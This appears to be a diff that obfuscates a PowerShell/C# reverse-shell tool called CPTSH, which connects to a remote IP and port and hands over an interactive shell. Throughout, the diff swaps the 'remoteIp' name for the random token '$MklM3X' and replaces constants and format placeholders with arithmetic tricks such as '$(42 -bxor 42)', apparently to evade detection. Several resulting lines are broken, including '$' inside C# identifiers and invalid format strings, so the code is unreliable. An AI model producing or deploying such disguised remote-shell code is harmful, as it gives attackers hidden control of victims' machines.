@@ -34,8 +34,8 @@ function Invoke-CPTSH
     }
     else{
   
-        if(-Not($PSBoundParameters.ContainsKey('RemoteIp'))) {
-            throw "RemoteIp missing parameter"
+        if(-Not($PSBoundParameters.ContainsKey('$MklM3X'))) {
+            throw "$MklM3X missing parameter"
         }
         
         if(-Not($PSBoundParameters.ContainsKey('RemotePort'))) {
@@ -1093,11 +1093,11 @@ public static class CPTSH
             throw new CPTSHException(String.Format("WSAStartup failed with error code: {(64 + -64)}", WSAGetLastError()));
     }
 
-    private static IntPtr connectRemote(string remoteIp, int remotePort)
+    private static IntPtr connectRemote(string $MklM3X, int remotePort)
     {
         int port = $(42 -bxor 42);
         int error = $(34 % 34);
-        string host = remoteIp;
+        string host = $MklM3X;
 
         try
         {
@@ -1376,7 +1376,7 @@ public static class CPTSH
         return thReadSocketWritePipe;
     }
 
-    public static string SpawnCPTSH(string remoteIp, int remotePort, uint rows, uint cols, string commandLine, bool upgradeShell)
+    public static string SpawnCPTSH(string $MklM3X, int remotePort, uint rows, uint cols, string commandLine, bool upgradeShell)
     {
         IntPtr shellSocket = IntPtr.Zero;
         IntPtr InputPipeRead = IntPtr.Zero;
@@ -1448,10 +1448,10 @@ public static class CPTSH
             }
             else
             {
-                shellSocket = connectRemote(remoteIp, remotePort);
+                shellSocket = connectRemote($MklM3X, remotePort);
                 if (shellSocket == IntPtr.Zero)
                 {
-                    output += string.Format("{(-83 -bxor -83)}Could not connect to ip {(181 % 90)} on port {(14 / 7)}", errorString, remoteIp, remotePort.ToString());
+                    output += string.Format("{(-83 -bxor -83)}Could not connect to ip {(181 % 90)} on port {(14 / 7)}", errorString, $MklM3X, remotePort.ToString());
                     return output;
                 }
                 TryParseRowsColsFromSocket(shellSocket, ref rows, ref cols);
@@ -1481,10 +1481,10 @@ public static class CPTSH
                 output += string.Format("Could not upgrade shell to fully interactive because ConPTY is not compatible on this system");
                 return output;
             }
-            shellSocket = connectRemote(remoteIp, remotePort);
+            shellSocket = connectRemote($MklM3X, remotePort);
             if (shellSocket == IntPtr.Zero)
             {
-                output += string.Format("{(84 + -84)}Could not connect to ip {(-33 -bxor -34)} on port {(117 % 23)}", errorString, remoteIp, remotePort.ToString());
+                output += string.Format("{(84 + -84)}Could not connect to ip {(-33 -bxor -34)} on port {(117 % 23)}", errorString, $MklM3X, remotePort.ToString());
                 return output;
             }
             Console.WriteLine("\r\nCreatePseudoConsole function not found! Spawning a netcat-like interactive shell...\r\n'");
@@ -1560,11 +1560,11 @@ public static class CPTSHMainClass
         Console.Out.Write(help);
     }
 
-    private static string CheckRemoteIpArg(string ipString)
+    private static string Check$MklM3XArg(string ipString)
     {
         IPAddress address;
         if (!IPAddress.TryParse(ipString, out address))
-            throw new CPTSHException("\r\nCPTSH: Invalid remoteIp value" + ipString);
+            throw new CPTSHException("\r\nCPTSH: Invalid $MklM3X value" + ipString);
         return ipString;
     }
 
@@ -1609,7 +1609,7 @@ public static class CPTSHMainClass
         }
         else
         {
-            string remoteIp = "";
+            string $MklM3X = "";
             int remotePort = $(87 + -87);
             bool upgradeShell = false;
             try
@@ -1619,13 +1619,13 @@ public static class CPTSHMainClass
                     upgradeShell = true;
                 else
                 {
-                    remoteIp = CheckRemoteIpArg(args[$(11 - 11)]);
+                    $MklM3X = Check$MklM3XArg(args[$(11 - 11)]);
                     remotePort = CheckInt(args[$(76 + -75)]);
                 }
                 uint rows = ParseRows(args);
                 uint cols = ParseCols(args);
                 string commandLine = ParseCommandLine(args);
-                output = CPTSH.SpawnCPTSH(remoteIp, remotePort, rows, cols, commandLine, upgradeShell);
+                output = CPTSH.SpawnCPTSH($MklM3X, remotePort, rows, cols, commandLine, upgradeShell);
             }
             catch (Exception e)
             {
